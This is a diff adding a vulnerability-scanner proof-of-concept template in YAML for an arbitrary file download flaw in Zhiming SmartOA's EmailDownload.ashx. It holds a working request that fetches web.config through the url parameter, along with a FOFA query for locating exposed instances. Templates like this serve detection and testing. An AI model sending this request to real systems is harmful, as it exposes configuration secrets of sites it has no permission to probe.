@@ -1,0 +1,15 @@
+id: poc-yaml-zhiming-smartoa-emaildownload-ashx-anyfile-download
+info:
+  name: 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 智明 SmartOA
+  fofa: app="智明协同-SmartOA"
+requests:
+- method: GET
+  path: /file/EmailDownload.ashx?url=~/web.config&name=web.config
+  expression: status_code == 200 && contains(body,"<configuration>") && contains(headers,"filename=web.config")
+    && contains(body,"<appSettings>")
+variables: {}
+transport: http
